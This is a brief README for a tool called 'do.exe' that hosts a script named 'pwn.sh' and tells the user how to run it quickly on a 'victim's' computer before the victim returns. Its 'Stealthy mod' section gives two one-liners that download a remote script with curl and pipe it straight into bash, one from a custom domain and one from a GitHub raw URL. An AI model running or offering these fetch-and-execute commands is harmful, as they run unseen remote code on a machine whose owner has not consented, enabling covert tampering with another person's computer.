# do.exe

## Get started

To build the script and exposing it on port 80:

```
docker compose up --build
```

## Stealthy mod

You are in a panic state, your victim can come from one moment to another and you need to execute the script at full speed without go in GitHub:

### With DNS :

```
bash <(curl -L do.yubu.app/pwn.sh)
```

### Without DNS :

```
bash <(curl https://raw.githubusercontent.com/LeoFVO/do.exe/main/pwn.sh)
```
